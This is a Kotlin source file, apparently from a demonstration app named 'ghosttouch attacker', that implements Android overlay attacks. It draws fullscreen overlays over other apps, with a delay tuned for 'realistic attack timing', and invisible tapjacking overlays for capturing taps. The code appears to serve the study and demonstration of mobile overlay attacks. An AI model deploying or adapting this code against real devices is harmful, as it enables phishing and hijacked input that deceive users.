package com.ghosttouch.attacker.overlay

import android.content.Context
import android.graphics.PixelFormat
import android.os.Handler
import android.os.Looper
import android.view.Gravity
import android.view.WindowManager
import androidx.compose.runtime.Composable
import androidx.compose.ui.platform.ComposeView
import androidx.lifecycle.Lifecycle
import androidx.lifecycle.LifecycleOwner
import androidx.lifecycle.LifecycleRegistry
import androidx.lifecycle.setViewTreeLifecycleOwner
import androidx.savedstate.SavedStateRegistry
import androidx.savedstate.SavedStateRegistryController
import androidx.savedstate.SavedStateRegistryOwner
import androidx.savedstate.setViewTreeSavedStateRegistryOwner

/**
 * Manages the lifecycle of overlay views drawn on top of other apps.
 *
 * ## How overlays work on Android
 * [WindowManager.addView] can add views to the system window layer using
 * [WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY]. This draws the view
 * on top of ALL other apps, regardless of which app is in the foreground.
 *
 * ## Key flags
 * - **TYPE_APPLICATION_OVERLAY**: Required overlay type on API 26+
 * - **FLAG_NOT_TOUCH_MODAL**: Allows touches outside the overlay to pass through
 *   to the app underneath (but captures touches ON the overlay)
 * - **FLAG_LAYOUT_IN_SCREEN**: Positions the overlay using screen coordinates
 *
 * ## ComposeView in Service context
 * Since overlays are created from a Service (not an Activity), we need to
 * manually provide lifecycle and saved-state owners for Compose to function.
 * This is done via [OverlayLifecycleOwner] which implements both interfaces.
 *
 * @param context Application context (must be app context for WindowManager).
 */
class OverlayManager(private val context: Context) {

    private val windowManager: WindowManager =
        context.getSystemService(Context.WINDOW_SERVICE) as WindowManager

    private var currentOverlay: ComposeView? = null
    private var lifecycleOwner: OverlayLifecycleOwner? = null
    private val handler = Handler(Looper.getMainLooper())

    /** Whether an overlay is currently being displayed. */
    val isShowing: Boolean get() = currentOverlay != null

    /**
     * Shows a fullscreen overlay with the given Compose content.
     *
     * The overlay is displayed on top of all other apps with a configurable
     * delay to simulate realistic attack timing.
     *
     * @param delayMs Delay before showing the overlay (300-500ms is realistic).
     * @param content The Compose content to render in the overlay.
     */
    fun show(delayMs: Long = 400, content: @Composable () -> Unit) {
        if (isShowing) return

        handler.postDelayed({
            showImmediate(content)
        }, delayMs)
    }

    /**
     * Shows the overlay immediately without delay.
     * Must be called on the main thread.
     */
    private fun showImmediate(content: @Composable () -> Unit) {
        if (isShowing) return

        // Create lifecycle owner for Compose in service context
        val owner = OverlayLifecycleOwner()
        lifecycleOwner = owner

        val composeView = ComposeView(context).apply {
            setViewTreeLifecycleOwner(owner)
            setViewTreeSavedStateRegistryOwner(owner)
            setContent(content)
        }

        // Window layout params for fullscreen overlay
        val params = WindowManager.LayoutParams(
            WindowManager.LayoutParams.MATCH_PARENT,
            WindowManager.LayoutParams.MATCH_PARENT,
            WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY,
            // FLAG_NOT_TOUCH_MODAL: touches on overlay are captured,
            // touches outside pass through to underlying app
            WindowManager.LayoutParams.FLAG_NOT_TOUCH_MODAL
                or WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN,
            PixelFormat.TRANSLUCENT
        ).apply {
            gravity = Gravity.TOP or Gravity.START
        }

        try {
            windowManager.addView(composeView, params)
            currentOverlay = composeView
            owner.handleLifecycleEvent(Lifecycle.Event.ON_CREATE)
            owner.handleLifecycleEvent(Lifecycle.Event.ON_START)
            owner.handleLifecycleEvent(Lifecycle.Event.ON_RESUME)
        } catch (e: Exception) {
            // Overlay permission may have been revoked
            currentOverlay = null
            lifecycleOwner = null
        }
    }

    /**
     * Shows a transparent/tapjacking overlay for capturing unintended taps.
     *
     * Uses FLAG_NOT_FOCUSABLE so the overlay doesn't capture input focus,
     * allowing all touches to pass through to the app underneath. The overlay
     * is invisible but can still intercept touch events for logging.
     *
     * @param content The Compose content (typically transparent with hidden buttons).
     */
    fun showTapjacking(content: @Composable () -> Unit) {
        if (isShowing) return

        val owner = OverlayLifecycleOwner()
        lifecycleOwner = owner

        val composeView = ComposeView(context).apply {
            setViewTreeLifecycleOwner(owner)
            setViewTreeSavedStateRegistryOwner(owner)
            setContent(content)
        }

        val params = WindowManager.LayoutParams(
            WindowManager.LayoutParams.MATCH_PARENT,
            WindowManager.LayoutParams.MATCH_PARENT,
            WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY,
            // FLAG_NOT_FOCUSABLE: overlay doesn't take input focus
            // FLAG_NOT_TOUCH_MODAL: touches pass through
            WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE
                or WindowManager.LayoutParams.FLAG_NOT_TOUCH_MODAL
                or WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN,
            PixelFormat.TRANSLUCENT
        ).apply {
            gravity = Gravity.TOP or Gravity.START
        }

        try {
            windowManager.addView(composeView, params)
            currentOverlay = composeView
            owner.handleLifecycleEvent(Lifecycle.Event.ON_CREATE)
            owner.handleLifecycleEvent(Lifecycle.Event.ON_START)
            owner.handleLifecycleEvent(Lifecycle.Event.ON_RESUME)
        } catch (_: Exception) {
            currentOverlay = null
            lifecycleOwner = null
        }
    }

    /**
     * Removes the currently displayed overlay from the screen.
     */
    fun hide() {
        currentOverlay?.let { view ->
            try {
                lifecycleOwner?.handleLifecycleEvent(Lifecycle.Event.ON_PAUSE)
                lifecycleOwner?.handleLifecycleEvent(Lifecycle.Event.ON_STOP)
                lifecycleOwner?.handleLifecycleEvent(Lifecycle.Event.ON_DESTROY)
                windowManager.removeView(view)
            } catch (_: Exception) {
                // View may have already been removed
            }
        }
        currentOverlay = null
        lifecycleOwner = null
    }
}

/**
 * Custom lifecycle owner for Compose views running in a Service context.
 *
 * Activities and Fragments provide lifecycle and saved-state owners automatically,
 * but Services do not. This class provides both so that Compose can function
 * properly when rendered inside an overlay from a foreground service.
 */
internal class OverlayLifecycleOwner : LifecycleOwner, SavedStateRegistryOwner {

    private val lifecycleRegistry = LifecycleRegistry(this)
    private val savedStateRegistryController = SavedStateRegistryController.create(this)

    override val lifecycle: Lifecycle get() = lifecycleRegistry
    override val savedStateRegistry: SavedStateRegistry
        get() = savedStateRegistryController.savedStateRegistry

    init {
        savedStateRegistryController.performRestore(null)
    }

    fun handleLifecycleEvent(event: Lifecycle.Event) {
        lifecycleRegistry.handleLifecycleEvent(event)
    }
}
